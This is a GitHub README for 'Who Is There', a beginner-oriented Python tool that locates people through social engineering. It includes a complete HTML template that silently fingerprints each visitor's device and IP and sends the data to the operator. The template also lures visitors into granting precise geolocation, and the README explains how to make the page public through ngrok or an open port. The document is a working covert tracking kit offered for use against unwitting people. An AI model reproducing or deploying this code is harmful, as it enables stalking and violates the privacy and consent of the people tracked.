# **Who Is There**
## Locate peoples using python and social engineering!

#### Who Is There is an open-source beginner-friendly app for locating people using social engineering!
#### This app is **HEAVILLY** inspired by an [Seeker](https://github.com/thewhiteh4t/seeker) by [thewhiteh4t](https://github.com/thewhiteh4t).

<a href="https://github.com/tspstudio/WhoIsThere#getting-started">
    <img src="https://dabuttonfactory.com/button.png?t=Getting Started&f=Open+Sans&ts=15&tc=000&hp=25&vp=10&c=5&bgt=unicolored&bgc=099400">
</a>
<a href="https://github.com/tspstudio/WhoIsThere#advanced">
    <img src="https://dabuttonfactory.com/button.png?t=Advanced&f=Open+Sans&ts=15&tc=000&hp=25&vp=10&c=5&bgt=unicolored&bgc=099400">
</a>

## Getting Started
### Sooo... lets get started!
1. First install [Python](https://www.python.org) if you dont have it.

2. Install project using ```Code -> Download Zip``` and unzipping it, or install via ```git clone https://github.com/tspstudio/WhoIsThere```.

3. If you are running WhoIsThere on Windows, before using run ```install.bat```.
#####     If you're running it on any other OS based on Linux, run ```install.sh```.
#####     On MacOS X in terminal run ```cd WhoIsThere-main/```, and ```python3 -m pip install -r requirements.txt```

4. Done! Now run ```WhoIsThere.py``` file. It will automatically check for updates.

##### If no updates required, select a template from list and wait until it will start powerful web server based on python [Tornado](https://pypi.org/project/tornado/) framework.

##### If there's an update, go to link displayed on the screen and follow these steps above.

Flags when running WhoIsThere:

-p or --port : Run web server on selected port. Default: 8080
     
-v or --version : Print current version
     
-u or --update : Check for updates. Go [here](https://github.com/tspstudio/WhoIsThere#if-no-updates-required-select-a-template-from-list-and-wait-until-it-will-start-powerful-web-server-based-on-python-tornado-framework).

# Advanced

### How to create templates!

You want something harder? Let's create own template!

1. If you want to create template, go to ```pages\pages.json```, and add to "pages" list
```
        {
            "name": "Your template name",
            "dir": "Your template folder name"
        }
```

2. In ```pages``` directory create folder with the same name as parameter ```dir``` in ```pages.json```.

3. Go into this folder and create file ```index.html```.

4. In this file paste
```
<!DOCTYPE html>
<html>
<head>
	<title>Geolocator</title>
	<script>
		function locate()
		{
		  if(navigator.geolocation)
		  {
		    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
		    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
		  }
		  else
		  {
		    alert('Geolocation is not Supported by your Browser...');
		  }

		function showPosition(position)
		  {
		    var lat = position.coords.latitude;
		    if( lat ){
		      lat = lat + ' deg';
		    }
		    else {
		      lat = 'Not Available';
		    }
		    var lon = position.coords.longitude;
		    if( lon ){
		      lon = lon + ' deg';
		    }
		    else {
		      lon = 'Not Available';
		    }
		    var acc = position.coords.accuracy;
		    if( acc ){
		      acc = acc + ' m';
		    }
		    else {
		      acc = 'Not Available';
		    }
		    var alt = position.coords.altitude;
		    if( alt ){
		      alt = alt + ' m';
		    }
		    else {
		      alt = 'Not Available';
		    }
		    var dir = position.coords.heading;
		    if( dir ){
		      dir = dir + ' deg';
		    }
		    else {
		      dir = 'Not Available';
		    }
		    var spd = position.coords.speed;
		    if( spd ){
		      spd = spd + ' m/s';
		    }
		    else {
		      spd = 'Not Available';
		    }

		    var ok_status = 'success';

		    serverSend(JSON.stringify({Status: ok_status,Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd}))
		  };
		}

		function showError(error)
		{
		  var err_text;
		  var err_status = 'failed';

			switch(error.code)
		  {
				case error.PERMISSION_DENIED:
					err_text = 'User denied the request for Geolocation';
		      alert('Please Refresh This Page and Allow Location Permission...');
		      break;
				case error.POSITION_UNAVAILABLE:
					err_text = 'Location information is unavailable';
					break;
				case error.TIMEOUT:
					err_text = 'The request to get user location timed out';
		      alert('Please Set Your Location Mode on High Accuracy...');
					break;
				case error.UNKNOWN_ERROR:
					err_text = 'An unknown error occurred';
					break;
			}

		  serverSend(JSON.stringify({Status: "Denied"}));
		}
	</script>
	<script>
		function information()
		{
		  var ptf = navigator.platform;
		  var cc = navigator.hardwareConcurrency;
		  var ram = navigator.deviceMemory;
		  var ver = navigator.userAgent;
		  var str = ver;
		  var os = ver;
		  //gpu
		  var canvas = document.createElement('canvas');
		  var gl;
		  var debugInfo;
		  var ven;
		  var ren;
		  var ip;
		  //sysinfo
		  console.log(ver);
		  console.log(ptf);

		  if (cc == undefined)
		  {
		    cc = 'Not Available';
		    console.log('Cores are not available')
		  }
		  console.log(cc);
		  if (ram == undefined)
		  {
		    ram = 'Not Available';
		    console.log('RAM is not available')
		  }
		  console.log(ram);
		  if (ver.indexOf('Firefox') != -1)
		  {
		    str = str.substring(str.indexOf(' Firefox/') + 1);
		    str = str.split(' ');
		    brw = str[0];
		    console.log(str[0]);
		  }
		  else if (ver.indexOf('Chrome') != -1)
		  {
		    str = str.substring(str.indexOf(' Chrome/') + 1);
		    str = str.split(' ');
		    brw = str[0];
		    console.log(str[0]);
		  }
		  else if (ver.indexOf('Safari') != -1)
		  {
		    str = str.substring(str.indexOf(' Safari/') + 1);
		    str = str.split(' ');
		    brw = str[0];
		    console.log(str[0]);
		  }
		  else if (ver.indexOf('Edge') != -1)
		  {
		    str = str.substring(str.indexOf(' Edge/') + 1);
		    str = str.split(' ');
		    brw = str[0];
		    console.log(str[0]);
		  }
		  else
		  {
		    brw = 'Not Available'
		    console.log('Browser is not available')
		  }
		  try
		  {
		    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
		  }
		  catch (e) {}
		  if (gl)
		  {
		    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
		    ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
		    ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
		  }
		  if (ven == undefined)
		  {
		    ven = 'Not Available';
		    console.log('GPU Vendor not available')
		  }
		  if (ren == undefined)
		  {
		    ren = 'Not Available';
		    console.log('GPU Renderer not available')
		  }
		  console.log(ven);
		  console.log(ren);
		  //
		  var ht = window.screen.height
		  var wd = window.screen.width
		  console.log(window.screen.height)
		  console.log(window.screen.width)
		  //os
		  os = os.substring(0, os.indexOf(')'));
		  os = os.split(';');
		  os = os[1];
		  if (os == undefined)
		  {
		    os = 'Not Available';
		    console.log('OS is not available')
		  }
		  os = os.trim();
		  console.log(os);
		  $.ajax({
		   type:'get',
		   url:'http://ip-api.com/json',
		   dataType:'json'
		  }).done(function(data) {
		  	ip = data.query;
		  	serverSend(JSON.stringify({Ip: ip}));
		  });
		  serverSend(JSON.stringify({Ip: ip, Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os}));
		}
	</script>
	<script>
		function serverSend(data) {
			$.ajax({
			  type: 'POST',
			  url: '',
			  data: {userData: data},
			  mimeType: 'text'
			});
		}
	</script>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
</head>
<body onload="information();">
    <h1>If you're know some HTML, add here your elements.</h1>
    <button onclick="locate();">And edit this button but DONT REMOVE ONCLICK ARGUMENT</button>
</body>
</html>
```

Done! Now, when user visit your website, it will send you information of his device, like:

- IP Address

- Continent

- Country

- Region

- City

- Organisation

- ISP

- Platform

- Browser

- Number of CPU

- Gb of RAM

- GPU WebGL vendor

- GPU WebGL renderer

- Screen height

- Screen width

- OS

If user clicked button and accepted geolocation, it will send you

- Longitude

- Latitude

- Google Maps link

- Locator accuracy (Sometimes may be unavaliable)

- Altitude (Sometimes may be unavaliable)

- Movement direction (Sometimes may be unavaliable)

- Movement speed (Sometimes may be unavaliable)

### Setting up Who Is There!

You can set up Who Is There from ```settings.py``` file.

Go to ```settings.py``` file and edit these values:

- host : Server will run on this IP address. You can edit or delete variable and add
```
import socket
host = socket.gethostbyname(socket.gethostname())
```

- port : Server will run on this port.

- debug : If ```True```, all HTTP logs will be visible in console.

### Connecting WhoIsThere to the world!

If you want to make your page public, there's very **very** **VEERY** many ways to do it.

So, i'll show you two most popular ways.

## Way 1.

1. Install [ngrok](https://dashboard.ngrok.com/get-started/setup) and follow steps on these site.

2. Run ```ngrok http (your web server port)``` and copy link displayed on the screen.

To access your page, use copied link.

## Way 2

1. If you don't have static ip address, buy it on your internet provider.

2. Go to your router settings using [this](192.168.0.1) or [this](192.168.1.1).

If not working, search your router local ip or look bottom of your router.

3. Search how to open port on your router and do it.

4. Disable firewall on your device.

To access your page, get your public ip on [2ip.io](https://2ip.io/). Your site now on your ip.

# Have fun with Who Is There!
